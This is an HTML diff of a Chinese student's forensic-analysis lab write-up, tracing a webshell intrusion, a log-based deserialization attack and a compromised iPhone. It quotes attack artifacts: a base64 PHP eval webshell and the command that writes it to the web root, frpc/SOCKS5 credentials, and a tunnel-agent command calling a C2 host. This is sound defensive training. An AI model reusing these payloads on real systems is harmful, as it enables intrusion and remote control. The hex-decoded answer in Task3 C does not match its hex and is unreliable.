@@ -336,198 +336,242 @@
               <div class="markdown-body">
                 
                 <meta name="referrer" content="no-referrer" />
-
-<h1 id="Lab-13-溯源与取证分析实验"><a href="#Lab-13-溯源与取证分析实验" class="headerlink" title="Lab 13-溯源与取证分析实验"></a>Lab 13-溯源与取证分析实验</h1><p><em>思考过程简略，因为有所借鉴。。。</em></p>
+<h1>Lab 13-溯源与取证分析实验</h1>
+<p><em>思考过程简略，因为有所借鉴。。。</em></p>
 <hr>
-<h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p><del>删掉啦</del></p>
+<h3 id="实验内容">实验内容</h3>
+<p><s>删掉啦</s></p>
 <!-- 溯源取证分析作为网络攻防过程中重要环节，准确找到攻击者的入侵线索(尤其是攻击突破口、攻击IP地址、域名、工具等信息)，对于企业或者团队安全运营团队来说都是必备技能。常规攻击取证过程中往往会结合流量、Web访问日志、终端系统或者软件日志等信息来挖掘或者推断相关线索。本实验通过网络流量、日志等溯源环境进行真实案例模仿，通过实战化分析来锻炼学生的取证溯源能力，从而加深大家对于网络攻防的实战化水平。在本实验结束时，学生应该能够具备对网络流量和日志的基本分析能力。 -->
-
 <hr>
-<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="Task1-Webshell数据包-webshell-zip"><a href="#Task1-Webshell数据包-webshell-zip" class="headerlink" title="Task1 Webshell数据包(webshell.zip)"></a>Task1 Webshell数据包(webshell.zip)</h4><p>小张单位网站被黑客挂马，请从流量中分析出webshell，并进行回答：</p>
+<h3 id="实验步骤">实验步骤</h3>
+<h4 id="Task1-Webshell数据包-webshell-zip">Task1 Webshell数据包(webshell.zip)</h4>
+<p>小张单位网站被黑客挂马，请从流量中分析出webshell，并进行回答：</p>
 <p>A.  黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。</p>
 <p>B.  黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。</p>
 <hr>
-<h5 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h5><ol>
-<li><p>搜索login，在No.101发现很轻易就拿到了输入的用户名和密码</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112950552.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112958107.png" srcset="/img/loading.gif" lazyload></p>
-</li>
-<li><p>因为知道是用了webshell攻击，所以肯定是执行了system命令的，搜了一下发现了返回’a’</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113005130.png" srcset="/img/loading.gif" lazyload></p>
-</li>
-<li><p>但是后面的system对应的参数都是aaa，执行了下述这些命令</p>
+<h5 id="问题分析">问题分析</h5>
 <ol>
-<li><p>system(‘whoami’);  </p>
+<li>
+<p>搜索login，在No.101发现很轻易就拿到了输入的用户名和密码</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112950552.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226112958107.png" srcset="/img/loading.gif" lazyload alt=""></p>
+</li>
+<li>
+<p>因为知道是用了webshell攻击，所以肯定是执行了system命令的，搜了一下发现了返回’a’</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113005130.png" srcset="/img/loading.gif" lazyload alt=""></p>
+</li>
+<li>
+<p>但是后面的system对应的参数都是aaa，执行了下述这些命令</p>
+<ol>
+<li>
+<p>system(‘whoami’);</p>
 <p>获取当前程序运行的用户</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113016118.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113016118.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>system(‘ipconfig’);</p>
+<li>
+<p>system(‘ipconfig’);</p>
 <p>显示当前计算机的网络配置信息</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113027296.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113027296.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>system(‘pwd’);</p>
+<li>
+<p>system(‘pwd’);</p>
 <p>显示当前工作目录</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113035463.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113035463.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>system(‘echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4&#x3D;|base64 -d’);</p>
+<li>
+<p>system(‘echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4=|base64 -d’);</p>
 <p>将这段字符串用base64解码后，发现为</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
 <p>这是一个明显的恶意代码，若写入web服务器的php文件后，可以用蚁剑连接拿到shell</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113043324.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113043324.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>system(‘echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4&#x3D;|base64 -d &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;1.php’);</p>
+<li>
+<p>system(‘echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4=|base64 -d &gt; /var/www/html/1.php’);</p>
 <p>果然，这里就执行了</p>
 <p>在web服务器的 <code>/var/www/html</code> 目录下生成了一个文件 <code>1.php</code>，内容为上述的恶意代码</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113051901.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113051901.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
 </ol>
 </li>
-<li><p>继续跟踪<code>aaa</code></p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113059479.png" srcset="/img/loading.gif" lazyload></p>
+<li>
+<p>继续跟踪<code>aaa</code></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113059479.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <ol>
-<li><p>第一个item可以看出是明显的蚁剑连接</p>
+<li>
+<p>第一个item可以看出是明显的蚁剑连接</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asenc</span>(<span class="hljs-params"><span class="hljs-variable">$out</span></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;&#125;;.....<br></code></pre></td></tr></table></figure>
 </li>
-<li><p>第二个item中的值进行base64解码</p>
+<li>
+<p>第二个item中的值进行base64解码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-keyword">var</span>/www/html/frpc.ini<br></code></pre></td></tr></table></figure>
-
 <p>表示将路径 <code>/var/www/html/frpc.ini</code> 作为表单数据提交，即 将<code>frpc.ini</code>文件上传到服务器上，<font color='green'>攻击者能够通过这个文件访问服务器内的资源</font></p>
 </li>
-<li><p>第三个item中的值进行解析，这是一个ASCII编码，解码后得到</p>
+<li>
+<p>第三个item中的值进行解析，这是一个ASCII编码，解码后得到</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">[common]<br>server_addr = <span class="hljs-number">192.168</span>.<span class="hljs-number">239.123</span><br>server_port = <span class="hljs-number">7777</span><br>token = Xa3BJf2l5enmN6Z7A8mv<br><br>[test_sock5]<br>type = tcp<br>remote_port = <span class="hljs-number">8111</span><br>plugin = socks5<br>plugin_user = <span class="hljs-number">0</span>HDFt16cLQJ<br>plugin_passwd = JTN276Gp<br>use_encryption = <span class="hljs-literal">true</span><br>use_compression = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
-
 <p>可以拿到SOCKS5的user和passwd字段</p>
 </li>
 </ol>
 </li>
 </ol>
 <hr>
-<h5 id="A-黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。"><a href="#A-黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。" class="headerlink" title="A.  黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。"></a>A.  黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。</h5><p><font color='red'>（分析过程见上）</font></p>
+<h5 id="A-黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。">A.  黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。</h5>
+<p><font color='red'>（分析过程见上）</font></p>
 <ol>
-<li><p>登录系统</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113109222.png" srcset="/img/loading.gif" lazyload></p>
+<li>
+<p>登录系统</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113109222.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>写入webshell</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113117037.png" srcset="/img/loading.gif" lazyload></p>
+<li>
+<p>写入webshell</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113117037.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>使用蚁剑进行连接，拿到webshell并进行操作</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113124224.png" srcset="/img/loading.gif" lazyload></p>
+<li>
+<p>使用蚁剑进行连接，拿到webshell并进行操作</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113124224.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
 </ol>
 <hr>
-<h5 id="B-黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。"><a href="#B-黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。" class="headerlink" title="B.  黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。"></a>B.  黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。</h5><p><font color='red'>（分析过程见上）</font></p>
+<h5 id="B-黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。">B.  黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。</h5>
+<p><font color='red'>（分析过程见上）</font></p>
 <ol>
-<li><p>登录使用的账号、密码</p>
+<li>
+<p>登录使用的账号、密码</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">username: test<br>password: Admin123!@#<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113131503.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113131503.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>SOCKS5的账号、密码</p>
+<li>
+<p>SOCKS5的账号、密码</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">plugin_user = 0HDFt16cLQJ<br>plugin_passwd = JTN276Gp<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113138922.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113138922.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
 </ol>
 <hr>
-<h4 id="Task2-日志分析-日志分析-zip"><a href="#Task2-日志分析-日志分析-zip" class="headerlink" title="Task2 日志分析(日志分析.zip)"></a>Task2 日志分析(日志分析.zip)</h4><p>小明发现单位某应用程序被攻击后提取了对应的日志数据，请分析日志并进行作答：</p>
-<h5 id="A-网络存在源码泄漏，源码文件名是什么？-请提交带有文件后缀的文件名，例如x-txt，并对流量分析进行截图"><a href="#A-网络存在源码泄漏，源码文件名是什么？-请提交带有文件后缀的文件名，例如x-txt，并对流量分析进行截图" class="headerlink" title="A.  网络存在源码泄漏，源码文件名是什么？(请提交带有文件后缀的文件名，例如x.txt，并对流量分析进行截图)"></a>A.  网络存在源码泄漏，<strong>源码文件名是什么</strong>？(请提交带有文件后缀的文件名，例如x.txt，并对流量分析进行截图)</h5><ol>
-<li><p>直接在日志中以状态码200看一下攻击者成功访问了哪些文件</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113145574.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="Task2-日志分析-日志分析-zip">Task2 日志分析(日志分析.zip)</h4>
+<p>小明发现单位某应用程序被攻击后提取了对应的日志数据，请分析日志并进行作答：</p>
+<h5 id="A-网络存在源码泄漏，源码文件名是什么？-请提交带有文件后缀的文件名，例如x-txt，并对流量分析进行截图">A.  网络存在源码泄漏，<strong>源码文件名是什么</strong>？(请提交带有文件后缀的文件名，例如x.txt，并对流量分析进行截图)</h5>
+<ol>
+<li>
+<p>直接在日志中以状态码200看一下攻击者成功访问了哪些文件</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113145574.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <p>发现有<code>www.zip</code>，这是网站备份文件，本来不应该是普通用户能够访问的，所以网站应该泄露的就是<code>www.zip</code>文件</p>
 </li>
 </ol>
 <p><strong>网站泄露的是<code>www.zip</code>文件</strong></p>
 <hr>
-<h5 id="B-分析攻击流量，黑客往-tmp目录写入一个文件，文件名是什么？-请对流量分析进行截图"><a href="#B-分析攻击流量，黑客往-tmp目录写入一个文件，文件名是什么？-请对流量分析进行截图" class="headerlink" title="B.  分析攻击流量，黑客往&#x2F;tmp目录写入一个文件，文件名是什么？(请对流量分析进行截图)"></a>B.  分析攻击流量，黑客往&#x2F;tmp目录写入一个文件，<strong>文件名是什么</strong>？(请对流量分析进行截图)</h5><ol>
-<li><p>在日志中搜索’tmp’</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113153263.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="B-分析攻击流量，黑客往-tmp目录写入一个文件，文件名是什么？-请对流量分析进行截图">B.  分析攻击流量，黑客往/tmp目录写入一个文件，<strong>文件名是什么</strong>？(请对流量分析进行截图)</h5>
+<ol>
+<li>
+<p>在日志中搜索’tmp’</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113153263.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <p>攻击者尝试访问<code>/tmp/sess_car</code>文件，并往其中写入了一段序列化的php代码</p>
 <p>如果服务器对 <code>/tmp/sess_car</code> 文件执行反序列化操作，攻击者可以伪造数据触发 <code>call_user_func_array</code>，调用任意函数</p>
 </li>
 </ol>
 <p><strong>写入的是<code>sess_car</code>文件</strong></p>
 <hr>
-<h5 id="C-分析攻击流量，黑客使用的是什么漏洞读取了秘密文件？"><a href="#C-分析攻击流量，黑客使用的是什么漏洞读取了秘密文件？" class="headerlink" title="C.  分析攻击流量，黑客使用的是什么漏洞读取了秘密文件？"></a>C.  分析攻击流量，黑客使用的是<strong>什么漏洞</strong>读取了秘密文件？</h5><ol>
-<li><p>SplFileObject漏洞，当使用反序列化操作时，可以利用SplFileObject来触发一些安全漏洞</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113159425.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="C-分析攻击流量，黑客使用的是什么漏洞读取了秘密文件？">C.  分析攻击流量，黑客使用的是<strong>什么漏洞</strong>读取了秘密文件？</h5>
+<ol>
+<li>
+<p>SplFileObject漏洞，当使用反序列化操作时，可以利用SplFileObject来触发一些安全漏洞</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113159425.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
 </ol>
 <hr>
-<h4 id="Task3-攻击“苹果”注入-ios-zip"><a href="#Task3-攻击“苹果”注入-ios-zip" class="headerlink" title="Task3 攻击“苹果”注入(ios.zip)"></a>Task3 攻击“苹果”注入(ios.zip)</h4><p>一位苹果安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答：</p>
+<h4 id="Task3-攻击“苹果”注入-ios-zip">Task3 攻击“苹果”注入(ios.zip)</h4>
+<p>一位苹果安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答：</p>
 <p>A.  简述黑客的整个攻击过程，关键步骤请配图说明。</p>
 <p>B.  黑客所控制的C&amp;C服务器IP是什么？</p>
 <p>C.  被害者手机上被拿走了的私钥文件内容是什么？</p>
 <hr>
-<h5 id="问题分析-1"><a href="#问题分析-1" class="headerlink" title="问题分析"></a>问题分析</h5><ol>
-<li><p>在日志中搜索<code>php</code>，发现了<code>ma.php</code>，看起来很明显是一个植入的木马文件</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113206320.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="问题分析-v2">问题分析</h5>
+<ol>
+<li>
+<p>在日志中搜索<code>php</code>，发现了<code>ma.php</code>，看起来很明显是一个植入的木马文件</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113206320.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>第一个访问中有<code>fxxk=system(base64_decode(%27d2hvYW1p%27));</code></p>
+<li>
+<p>第一个访问中有<code>fxxk=system(base64_decode(%27d2hvYW1p%27));</code></p>
 <p>这表示攻击者试图传入fxxk参数，使服务器执行用base64编码后再解码的</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure>
-
 <p><strong>并且已经执行成功了，返回’200’，说明木马植入成功</strong></p>
 </li>
-<li><p>打开pcap文件，发现在第15条tcp流时，<strong>攻击者下载了一个文件<code>Stowaway</code></strong></p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113213190.png" srcset="/img/loading.gif" lazyload></p>
+<li>
+<p>打开pcap文件，发现在第15条tcp流时，<strong>攻击者下载了一个文件<code>Stowaway</code></strong></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113213190.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <p><code>Stowaway</code>是一个内网穿透工具，能够使攻击者通过这个文件访问用户中的所有文件</p>
 </li>
-<li><p>在这条流中搜索’ios_agent’，发现执行命令<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code></p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113220144.png" srcset="/img/loading.gif" lazyload></p>
+<li>
+<p>在这条流中搜索’ios_agent’，发现执行命令<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113220144.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <p>也就是说攻击者主机IP是 <code>3.128.156.159</code>，使用的加密密钥是<code>hack4sec</code></p>
 </li>
-<li><p>文件中的流量被加密了</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113227013.png" srcset="/img/loading.gif" lazyload></p>
+<li>
+<p>文件中的流量被加密了</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113227013.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>使用实验中给到的<code>keylog.txt</code>密钥文件进行解密</p>
+<li>
+<p>使用实验中给到的<code>keylog.txt</code>密钥文件进行解密</p>
 <p>编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;(Pre)-Master-Secret log filename-&gt;浏览…</p>
 <p>将<code>keylog.txt</code>加载进去</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113234094.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113234094.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>筛选出http2流量，发现有明显的sql注入攻击</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113241509.png" srcset="/img/loading.gif" lazyload></p>
+<li>
+<p>筛选出http2流量，发现有明显的sql注入攻击</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113241509.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <p><strong>确实是布尔注入</strong></p>
 </li>
-<li><p>进行端口扫描，在端口扫描时，大多数端口会显示关闭，返回RST，可以在专家模式中找到RST的最大和最小端口确定端口扫描范围</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113248670.png" srcset="/img/loading.gif" lazyload></p>
+<li>
+<p>进行端口扫描，在端口扫描时，大多数端口会显示关闭，返回RST，可以在专家模式中找到RST的最大和最小端口确定端口扫描范围</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113248670.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
 </ol>
 <hr>
-<h5 id="A-简述黑客的整个攻击过程，关键步骤请配图说明。"><a href="#A-简述黑客的整个攻击过程，关键步骤请配图说明。" class="headerlink" title="A.  简述黑客的整个攻击过程，关键步骤请配图说明。"></a>A.  简述黑客的整个攻击过程，关键步骤请配图说明。</h5><ol>
-<li><p>以3.128.156.159作为C&amp;C服务器，在192.168.1.8安装ios_agent，并执行命令<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code>控制主机</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113255246.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="A-简述黑客的整个攻击过程，关键步骤请配图说明。">A.  简述黑客的整个攻击过程，关键步骤请配图说明。</h5>
+<ol>
+<li>
+<p>以3.128.156.159作为C&amp;C服务器，在192.168.1.8安装ios_agent，并执行命令<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code>控制主机</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113255246.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>对192.168.1.8进行SQL注入攻击，获取敏感信息</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113302136.png" srcset="/img/loading.gif" lazyload></p>
+<li>
+<p>对192.168.1.8进行SQL注入攻击，获取敏感信息</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113302136.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>进行端口扫描</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113309050.png" srcset="/img/loading.gif" lazyload></p>
+<li>
+<p>进行端口扫描</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113309050.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
-<li><p>向主机中植入木马，写入webshell</p>
+<li>
+<p>向主机中植入木马，写入webshell</p>
 <p>攻击者试图传入fxxk参数，使服务器执行用base64编码后再解码的</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113316461.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113316461.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
 </ol>
-<h5 id="B-黑客所控制的C-C服务器IP是什么？"><a href="#B-黑客所控制的C-C服务器IP是什么？" class="headerlink" title="B.  黑客所控制的C&amp;C服务器IP是什么？"></a>B.  黑客所控制的C&amp;C服务器IP是什么？</h5><ol>
-<li><p>从上述可知，执行命令为<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code>，即攻击者控制的ip为<code>3.128.156.159</code></p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113322120.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="B-黑客所控制的C-C服务器IP是什么？">B.  黑客所控制的C&amp;C服务器IP是什么？</h5>
+<ol>
+<li>
+<p>从上述可知，执行命令为<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code>，即攻击者控制的ip为<code>3.128.156.159</code></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226113322120.png" srcset="/img/loading.gif" lazyload alt=""></p>
 </li>
 </ol>
 <hr>
-<h5 id="C-被害者手机上被拿走了的私钥文件内容是什么？"><a href="#C-被害者手机上被拿走了的私钥文件内容是什么？" class="headerlink" title="C.  被害者手机上被拿走了的私钥文件内容是什么？"></a>C.  被害者手机上被拿走了的私钥文件内容是什么？</h5><ol>
-<li><p><del>通过sql注入命令，可以知道攻击者在一个个尝试密码中的每一个字符。并且黑客遍历每一个字符的顺序为0x2B、0x2D、0x7B、0x7D、0x30……</del></p>
+<h5 id="C-被害者手机上被拿走了的私钥文件内容是什么？">C.  被害者手机上被拿走了的私钥文件内容是什么？</h5>
+<ol>
+<li>
+<p><s>通过sql注入命令，可以知道攻击者在一个个尝试密码中的每一个字符。并且黑客遍历每一个字符的顺序为0x2B、0x2D、0x7B、0x7D、0x30……</s></p>
 <p>依次这样分析剩下的所有数据包即可获得所有的16进制值</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">37343635386633206338343120343536642038356437206436633066656461626232<br></code></pre></td></tr></table></figure>
 </li>
-<li><p>解码16进制后得到</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">746558f3-c841-456b-85d7-d6c0f2edabb2<br></code></pre></td></tr></table></figure></li>
+<li>
+<p>解码16进制后得到</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">746558f3-c841-456b-85d7-d6c0f2edabb2<br></code></pre></td></tr></table></figure>
+</li>
 </ol>
 <p>即得到敏感信息为<code>746558f3-c841-456b-85d7-d6c0f2edabb2</code></p>
 <hr>
-<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>
+<h3 id="实验总结">实验总结</h3>
+<p><s>删掉啦</s></p>
 
                 
               </div>
